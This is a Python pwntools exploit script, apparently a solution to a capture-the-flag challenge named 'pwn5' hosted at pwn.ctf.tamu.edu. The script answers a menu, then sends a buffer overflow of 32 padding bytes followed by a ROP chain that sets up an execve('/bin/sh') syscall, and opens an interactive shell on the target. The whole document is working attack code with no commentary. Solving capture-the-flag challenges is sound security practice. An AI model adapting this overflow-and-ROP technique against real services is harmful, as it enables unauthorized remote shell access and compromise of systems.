#!/usr/bin/env python

from pwn import *
import time

r = remote('pwn.ctf.tamu.edu', 4325)
# r = process('./pwn5')

context.arch = 'i386'

shell = 0x080F1A20
pop_eax = 0x080bc396
pop_ecx = 0x080e4325
pop_edx = 0x0807338a
pop_esi_ebx = 0x0805ce50
syscall = 0x08071005

#r.recvuntil(':')
time.sleep(0.1)
r.sendline('/bin/sh\x00')
#r.recvuntil(':')
time.sleep(0.1)
r.sendline('y')
#r.recvuntil(':')
time.sleep(0.1)
r.sendline('y')
#r.recvuntil(':')
time.sleep(0.1)
r.sendline('y')
#r.recvuntil('4. Study\n')
time.sleep(0.1)
r.sendline('2')
#r.recvuntil(':')
time.sleep(0.1)
r.sendline('a' * 32 + flat([pop_eax, 0xb, pop_ecx, 0, pop_edx, 0, pop_esi_ebx, 0, shell, syscall]))

r.interactive()
